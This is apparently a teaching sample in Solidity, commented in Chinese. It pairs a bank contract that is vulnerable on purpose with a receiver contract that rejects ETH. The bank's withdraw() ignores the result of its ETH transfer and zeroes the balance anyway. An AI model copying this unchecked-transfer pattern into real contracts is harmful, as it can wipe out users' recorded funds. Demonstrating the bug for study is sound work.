pragma solidity >=0.8.0;

/*
漏洞名稱: Improper Check on Transfer Credit

描述:
在 withdraw() 函式中，合約在轉帳 ETH 後未檢查轉帳是否成功，接著直接將使用者的餘額清零。
若接收者因為特殊機制（例如 fallback 會 revert）而拒絕接受 ETH，則轉帳會失敗，但使用者的餘額仍被清零，造成資金錯誤。

測試及攻擊步驟:
1. 部署 VulnerableSimpleBank 合約。
2. 部署攻擊合約 RevertingReceiver，並在其建構子中指向 VulnerableSimpleBank 的位址。
3. 從 RevertingReceiver 合約呼叫 attackDeposit() 存入 ETH 至 VulnerableSimpleBank。
4. 從 RevertingReceiver 合約呼叫 attackWithdraw()，此時因為 RevertingReceiver 的 fallback 函式會 revert，導致銀行呼叫轉帳操作失敗，但賬戶餘額依然被歸零。
這代表存款者的帳面上顯示已提領，但實際上並未收到 ETH，造成資金錯誤的狀態。

注意：
原本程式碼中的 revert 字串包含中文，可能在某些編譯器環境中造成錯誤，因此這裡將錯誤訊息改為英文。
*/

contract VulnerableSimpleBank {
    // 使用者餘額映射 (漏洞重點: 在 withdraw() 中，未正確檢查轉帳結果)
    mapping(address => uint) public balances;

    // deposit 函式：允許存入 ETH
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // withdraw 函式：存在漏洞，未檢查轉帳是否成功即清零餘額
    function withdraw() external {
        uint amount = balances[msg.sender];
        // 漏洞所在: 使用 call() 轉帳但不確認回傳值
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        // 無論轉帳成功與否，餘額都直接被設為 0
        balances[msg.sender] = 0;
    }
}

// 攻擊合約：RevertingReceiver
// 此合約在接收 ETH 時會故意 revert，藉此讓 VulnerableSimpleBank.withdraw() 中的轉帳失敗
contract RevertingReceiver {
    VulnerableSimpleBank public bank;

    // 在部署時指定目標銀行合約位址
    constructor(address _bankAddress) {
        bank = VulnerableSimpleBank(_bankAddress);
    }

    // 攻擊步驟之一：從攻擊合約 deposit ETH 至銀行
    function attackDeposit() external payable {
        bank.deposit{value: msg.value}();
    }

    // 攻擊步驟之二：呼叫銀行的 withdraw()
    // 因為本合約的 fallback() 會 revert，故意造成轉帳失敗
    function attackWithdraw() external {
        bank.withdraw();
    }

    // fallback 函式：當收到 ETH 時，故意 revert，導致轉帳失敗
    fallback() external payable {
        revert("Reject ETH");
    }

    // receive 函式：同樣拒絕接受 ETH
    receive() external payable {
        revert("Reject ETH");
    }
}
